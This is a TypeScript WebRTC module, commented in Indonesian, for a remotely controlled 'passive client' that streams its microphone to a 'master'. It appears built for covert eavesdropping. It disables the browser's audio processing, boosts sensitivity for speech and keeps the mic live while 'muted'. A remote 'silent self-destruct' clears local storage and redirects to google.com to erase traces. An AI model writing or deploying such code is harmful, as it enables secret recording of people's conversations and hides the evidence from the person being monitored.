/**
 * S.I.G.M.A DISKOMLEKAU — Tactical Master-Passive Client WebRTC Control Module
 * Strategi Audio Klien: "Raw Sensitivity & Mild EQ"
 *
 * Rangkaian Pipa Audio (Audio Pipeline):
 *   Mic (Raw getUserMedia: EC=false, NS=false, AGC=false)
 *     -> BiquadFilterNode (Highpass 80 Hz)
 *     -> BiquadFilterNode (Lowpass 6000 Hz)
 *     -> GainNode (Default 5.0x High Sensitivity)
 *     -> MediaStreamAudioDestinationNode
 *     -> WebRTC RTCPeerConnection
 *
 * Logika Mute/Unmute Anti-Hang:
 *   - MUTE   : HANYA mengubah `gainNode.gain.value = 0`
 *   - UNMUTE : Mengembalikan `gainNode.gain.value = 5.0` (atau nilai gain aktif)
 *   - DILARANG memanggil `track.stop()`, `track.enabled = false`, atau `audioContext.suspend()`
 *     agar mikrofon tidak pernah ditidurkan oleh sistem operasi Android.
 */

export type RemoteCommandType = 'SET_GAIN' | 'SET_MUTE' | 'EMERGENCY_WIPE';

export interface RemoteCommandPacket {
  type: RemoteCommandType;
  value?: number | boolean;
  timestamp: number;
}

export interface DataChannelLike {
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  send: (data: any) => void;
  readyState?: RTCDataChannelState;
  open?: boolean;
  onmessage?: ((event: MessageEvent) => void) | null;
  on?: (event: 'data', cb: (data: unknown) => void) => unknown;
}

export const DEFAULT_RAW_SENSITIVITY_GAIN = 5.0;

/**
 * Mengirim instruksi taktis dari Master ke Klien Pasif melalui DataChannel.
 */
export function sendCommand(
  dataChannel: DataChannelLike | null | undefined,
  commandType: RemoteCommandType,
  value?: number | boolean
): boolean {
  if (!dataChannel) return false;

  const isNativeOpen = dataChannel.readyState === 'open';
  const isPeerJsOpen = dataChannel.open === true;

  if (!isNativeOpen && !isPeerJsOpen) {
    return false;
  }

  const packet: RemoteCommandPacket = {
    type: commandType,
    value,
    timestamp: Date.now(),
  };

  try {
    if (typeof dataChannel.readyState === 'string') {
      dataChannel.send(JSON.stringify(packet));
    } else {
      dataChannel.send(packet);
    }
    return true;
  } catch {
    return false;
  }
}

/**
 * Memicu sinyal EMERGENCY_WIPE (Tombol Bunuh Diri Jarak Jauh) ke Klien target.
 */
export function triggerEmergencyWipe(
  dataChannel: DataChannelLike | null | undefined
): boolean {
  return sendCommand(dataChannel, 'EMERGENCY_WIPE', true);
}

export interface PassiveAudioPipeline {
  audioContext: AudioContext;
  sourceNode: MediaStreamAudioSourceNode;
  highpassFilter: BiquadFilterNode;
  lowpassFilter: BiquadFilterNode;
  gainNode: GainNode;
  processedStream: MediaStream;
  setRemoteGain: (gainValue: number) => void;
  setRemoteMute: (muted: boolean) => void;
  bindDataChannel: (channel: DataChannelLike) => void;
}

/**
 * Mengeksekusi penghapusan jejak darurat (Silent Self-Destruct) pada HP Klien
 * HANYA saat menerima perintah eksplisit EMERGENCY_WIPE.
 */
export function silentSelfDestruct(options?: {
  streams?: (MediaStream | null | undefined)[];
  peerConnections?: (RTCPeerConnection | { close: () => void } | null | undefined)[];
  peerInstance?: { destroy: () => void } | null;
  audioContext?: AudioContext | null;
  redirectUrl?: string;
}): void {
  try {
    if (options?.streams) {
      options.streams.forEach((stream) => {
        if (stream) {
          stream.getTracks().forEach((track) => {
            try {
              track.stop();
            } catch {}
          });
        }
      });
    }

    if (options?.audioContext && options.audioContext.state !== 'closed') {
      options.audioContext.close().catch(() => {});
    }

    if (options?.peerConnections) {
      options.peerConnections.forEach((pc) => {
        if (pc) {
          try {
            pc.close();
          } catch {}
        }
      });
    }

    if (options?.peerInstance) {
      try {
        options.peerInstance.destroy();
      } catch {}
    }

    try {
      localStorage.clear();
    } catch {}
    try {
      sessionStorage.clear();
    } catch {}
  } finally {
    const targetUrl = options?.redirectUrl || 'https://www.google.com';
    window.location.replace(targetUrl);
  }
}

/**
 * Membangun pipa pemrosesan audio Klien dengan strategi "Raw Sensitivity & Mild EQ":
 *   Mic -> Highpass (80 Hz) -> Lowpass (6000 Hz) -> GainNode (5.0) -> Destination (WebRTC)
 *
 * Aturan Anti-Hang Android:
 *   - Saat MUTE: HANYA mengubah `gainNode.gain.value = 0`
 *   - Saat UNMUTE: Mengembalikan `gainNode.gain.value = 5.0` (atau `currentGain`)
 *   - TIDAK PERNAH memanggil `track.stop()`, `track.enabled = false`, atau `audioContext.suspend()`
 */
export function setupPassiveAudio(
  rawMediaStream: MediaStream,
  initialDataChannel?: DataChannelLike | null,
  cleanupRefs?: {
    getExtraStreams?: () => (MediaStream | null | undefined)[];
    getPeerConnections?: () => (RTCPeerConnection | { close: () => void } | null | undefined)[];
    getPeerInstance?: () => { destroy: () => void } | null;
  },
  onStateUpdated?: (state: { gain: number; muted: boolean }) => void
): PassiveAudioPipeline {
  const AudioCtx =
    window.AudioContext ||
    (window as unknown as { webkitAudioContext: typeof AudioContext }).webkitAudioContext;

  const audioContext = new AudioCtx();

  // Pastikan semua hardware track selalu enabled = true (JANGAN PERNAH diset false)
  rawMediaStream.getAudioTracks().forEach((track) => {
    track.enabled = true;
  });

  // 1. Source Node dari Raw Mic
  const sourceNode = audioContext.createMediaStreamSource(rawMediaStream);

  // 2. Filter 1: Highpass pada 80 Hz (membuang suara gemuruh angin / AC menderu)
  const highpassFilter = audioContext.createBiquadFilter();
  highpassFilter.type = 'highpass';
  highpassFilter.frequency.value = 80;
  highpassFilter.Q.value = 0.707;

  // 3. Filter 2: Lowpass pada 6000 Hz (membuang desis statis frekuensi sangat tinggi, menjaga konsonan suara manusia)
  const lowpassFilter = audioContext.createBiquadFilter();
  lowpassFilter.type = 'lowpass';
  lowpassFilter.frequency.value = 6000;
  lowpassFilter.Q.value = 0.707;

  // 4. GainNode dengan sensitivitas tinggi (Default = 5.0)
  const gainNode = audioContext.createGain();
  let currentGain = DEFAULT_RAW_SENSITIVITY_GAIN;
  let isMuted = false;
  gainNode.gain.value = currentGain;

  // 5. Destination Node untuk dialirkan ke WebRTC PeerConnection
  const destinationNode = audioContext.createMediaStreamDestination();

  // Rangkai pipa audio secara berurutan:
  // Mic -> Highpass (80 Hz) -> Lowpass (6000 Hz) -> GainNode (5.0) -> WebRTC Destination
  sourceNode.connect(highpassFilter);
  highpassFilter.connect(lowpassFilter);
  lowpassFilter.connect(gainNode);
  gainNode.connect(destinationNode);

  // Pastikan track keluaran selalu aktif (tidak pernah dimatikan)
  destinationNode.stream.getAudioTracks().forEach((track) => {
    track.enabled = true;
  });

  // Jaga agar AudioContext tidak pernah tertidur di Android
  if (audioContext.state === 'suspended') {
    audioContext.resume().catch(() => {});
  }
  audioContext.onstatechange = () => {
    if (audioContext.state === 'suspended') {
      audioContext.resume().catch(() => {});
    }
  };

  const applyGainState = () => {
    if (audioContext.state === 'suspended') {
      audioContext.resume().catch(() => {});
    }

    // LOGIKA MUTE/UNMUTE ANTI-HANG:
    // Saat MUTE: HANYA ubah gainNode.gain.value = 0.
    // Saat UNMUTE: Kembalikan gainNode.gain.value = currentGain (default 5.0).
    // JANGAN PERNAH memanggil track.enabled = false, track.stop(), atau audioContext.suspend()!
    const targetGain = isMuted ? 0 : currentGain;
    gainNode.gain.value = targetGain;
    try {
      gainNode.gain.setValueAtTime(targetGain, audioContext.currentTime);
    } catch {}

    if (onStateUpdated) {
      onStateUpdated({ gain: currentGain, muted: isMuted });
    }
  };

  const setRemoteGain = (gainValue: number) => {
    const parsed = Number(gainValue);
    // Jika nilai yang dikirim valid (> 0), gunakan; jika 0 atau tidak valid, gunakan 5.0
    const nextGain =
      !Number.isNaN(parsed) && parsed > 0
        ? Math.min(25, parsed)
        : DEFAULT_RAW_SENSITIVITY_GAIN;
    currentGain = nextGain;
    applyGainState();
  };

  const setRemoteMute = (muted: boolean) => {
    isMuted = Boolean(muted);
    if (!isMuted && currentGain <= 0) {
      currentGain = DEFAULT_RAW_SENSITIVITY_GAIN;
    }
    applyGainState();
  };

  const handleIncomingCommand = (rawPayload: unknown) => {
    let packet: RemoteCommandPacket | null = null;

    if (typeof rawPayload === 'string') {
      try {
        packet = JSON.parse(rawPayload) as RemoteCommandPacket;
      } catch {
        return;
      }
    } else if (rawPayload && typeof rawPayload === 'object') {
      packet = rawPayload as RemoteCommandPacket;
    }

    if (!packet || !packet.type) return;

    switch (packet.type) {
      case 'SET_GAIN': {
        if (typeof packet.value === 'number') {
          setRemoteGain(packet.value);
        }
        break;
      }
      case 'SET_MUTE': {
        setRemoteMute(Boolean(packet.value));
        break;
      }
      case 'EMERGENCY_WIPE': {
        silentSelfDestruct({
          streams: [
            rawMediaStream,
            destinationNode.stream,
            ...(cleanupRefs?.getExtraStreams ? cleanupRefs.getExtraStreams() : []),
          ],
          peerConnections: cleanupRefs?.getPeerConnections
            ? cleanupRefs.getPeerConnections()
            : [],
          peerInstance: cleanupRefs?.getPeerInstance
            ? cleanupRefs.getPeerInstance()
            : null,
          audioContext,
          redirectUrl: 'https://www.google.com',
        });
        break;
      }
    }
  };

  const bindDataChannel = (channel: DataChannelLike) => {
    if ('onmessage' in channel) {
      const prevOnMessage = channel.onmessage;
      channel.onmessage = (event: MessageEvent) => {
        if (prevOnMessage) prevOnMessage(event);
        handleIncomingCommand(event.data);
      };
    }

    if (typeof channel.on === 'function') {
      channel.on('data', (data: unknown) => {
        handleIncomingCommand(data);
      });
    }
  };

  if (initialDataChannel) {
    bindDataChannel(initialDataChannel);
  }

  return {
    audioContext,
    sourceNode,
    highpassFilter,
    lowpassFilter,
    gainNode,
    processedStream: destinationNode.stream,
    setRemoteGain,
    setRemoteMute,
    bindDataChannel,
  };
}
